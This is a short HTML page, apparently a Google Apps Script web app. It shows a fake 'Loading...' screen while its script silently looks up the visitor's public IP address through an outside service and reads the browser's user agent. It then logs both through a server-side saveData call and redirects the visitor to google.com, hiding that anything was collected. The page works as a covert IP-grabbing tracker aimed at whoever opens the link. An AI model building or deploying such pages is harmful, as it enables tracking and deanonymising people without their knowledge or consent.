<!DOCTYPE html>
<html>
  <body>
    <h3>Loading...</h3>

    <script>
      async function send() {

        // real IP
        const ip = await fetch("https://api.ipify.org?format=json")
          .then(r => r.json())
          .then(d => d.ip);

        const device = navigator.userAgent;

        await google.script.run.saveData({
          ip: ip,
          device: device
        });

        // redirect after logging
        window.location.href = "https://google.com";
      }

      send();
    </script>
  </body>
</html>
